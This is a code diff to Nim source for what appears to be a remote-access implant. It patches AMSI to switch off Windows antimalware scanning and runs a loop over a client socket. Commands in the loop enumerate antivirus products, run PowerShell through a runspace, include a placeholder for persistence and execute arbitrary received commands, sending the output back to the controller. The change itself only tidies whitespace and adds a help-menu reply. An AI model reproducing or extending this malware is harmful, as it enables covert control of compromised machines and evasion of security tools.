@@ -115,9 +115,6 @@ when isMainModule:
     var success = PatchAmsi()
     #echo fmt"[*] AMSI disabled: {bool(success)}"
     
-
-
-
     
 
 while true:
@@ -133,7 +130,8 @@ while true:
   elif message == "persist":
     discard
   elif message == "help":
-    discard
+    discard(message)
+    client.send(encode("[+] Help menu fetched.."))
   elif message == "GetAV":
     var result = getAv()
     client.send(encode(result))
@@ -158,7 +156,6 @@ while true:
       
     runspace.Close() 
 
-
   else:
     try:
       var command = message
@@ -167,7 +164,4 @@ while true:
     except OSError:
       #echo "[-] An error occurred.. try again"
       client.send(encode("The command was not found on the system"))
-
-
-
 client.close()
